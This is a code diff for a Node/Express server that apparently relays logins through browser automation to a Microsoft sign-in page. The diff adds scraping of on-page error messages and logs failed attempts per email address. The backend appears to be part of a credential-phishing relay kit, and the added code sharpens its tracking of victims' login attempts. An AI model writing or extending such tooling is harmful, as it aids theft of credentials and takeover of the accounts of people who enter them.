@@ -546,7 +546,36 @@ app.post('/api/login', async (req, res) => {
             if (!loginSuccess) {
                 analytics.invalidEntries++;
                 saveAnalytics();
-                saveInvalidEntry(sessionId, email, 'Login failed', 'Password authentication failed');
+                
+                // Get more specific error details
+                let errorDetails = 'Password authentication failed';
+                try {
+                    const currentUrl = session.automation.page.url();
+                    if (currentUrl.includes('error')) {
+                        errorDetails += ' - Authentication error detected in URL';
+                    }
+                    
+                    // Check for specific error messages on the page
+                    const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
+                    if (errorElements.length > 0) {
+                        for (let element of errorElements) {
+                            try {
+                                const errorText = await element.evaluate(el => el.textContent);
+                                if (errorText && errorText.trim()) {
+                                    errorDetails += ` - ${errorText.trim()}`;
+                                    break;
+                                }
+                            } catch (e) {
+                                // Skip if can't get text
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.log('Could not extract additional error details:', e.message);
+                }
+                
+                saveInvalidEntry(sessionId, email, 'Login Failed', errorDetails);
+                console.log(`📊 Invalid entry saved for ${email}: ${errorDetails}`);
             }
 
             res.json({
@@ -875,6 +904,32 @@ app.post('/api/continue-login', async (req, res) => {
                 responseMessage = 'Login may require additional verification';
                 analytics.invalidEntries++;
                 saveAnalytics();
+                
+                // Save invalid entry for failed continue-login
+                const email = session.email || 'unknown@unknown.com';
+                const currentUrl = session.automation.page.url();
+                let errorDetails = `Login verification failed. Current URL: ${currentUrl}`;
+                
+                // Try to get specific error message
+                try {
+                    const errorElements = await session.automation.page.$$('[role="alert"], .error, .ms-TextField-errorMessage');
+                    for (let element of errorElements) {
+                        try {
+                            const errorText = await element.evaluate(el => el.textContent);
+                            if (errorText && errorText.trim()) {
+                                errorDetails += ` - ${errorText.trim()}`;
+                                break;
+                            }
+                        } catch (e) {
+                            // Skip if can't get text
+                        }
+                    }
+                } catch (e) {
+                    console.log('Could not extract error details for continue-login failure');
+                }
+                
+                saveInvalidEntry(requestedSessionId, email, 'Continue Login Failed', errorDetails);
+                console.log(`📊 Invalid continue-login entry saved for ${email}`);
             }
 
             res.json({
